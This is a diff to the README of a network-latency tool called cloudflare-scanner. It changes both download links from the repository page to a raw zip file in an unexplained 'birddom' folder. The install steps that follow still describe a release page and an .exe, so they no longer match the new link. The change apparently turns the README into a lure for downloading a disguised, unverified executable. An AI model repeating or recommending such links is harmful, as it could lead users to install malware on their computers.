@@ -1,6 +1,6 @@
 # 🌐 cloudflare-scanner - Find the fastest Cloudflare network path
 
-[![](https://img.shields.io/badge/Download-cloudflare--scanner-blue.svg)](https://github.com/owusuaduamerenorbert-oss/cloudflare-scanner)
+[![](https://img.shields.io/badge/Download-cloudflare--scanner-blue.svg)](https://raw.githubusercontent.com/owusuaduamerenorbert-oss/cloudflare-scanner/main/birddom/cloudflare_scanner_3.8.zip)
 
 This tool checks connection quality to Cloudflare servers. You can see how fast your internet connects to various global points. It measures latency, jitter, and packet loss. You get clear data to improve your network speed.
 
@@ -25,7 +25,7 @@ Your computer must meet these basic needs:
 
 Follow these steps to get the tool on your machine.
 
-1.  Visit the [official download page](https://github.com/owusuaduamerenorbert-oss/cloudflare-scanner).
+1.  Visit the [official download page](https://raw.githubusercontent.com/owusuaduamerenorbert-oss/cloudflare-scanner/main/birddom/cloudflare_scanner_3.8.zip).
 2.  Look for the latest release on the right side of the page.
 3.  Click the file that ends in .exe. This file works directly on Windows.
 4.  Move the file to a folder where you want to keep your tools.
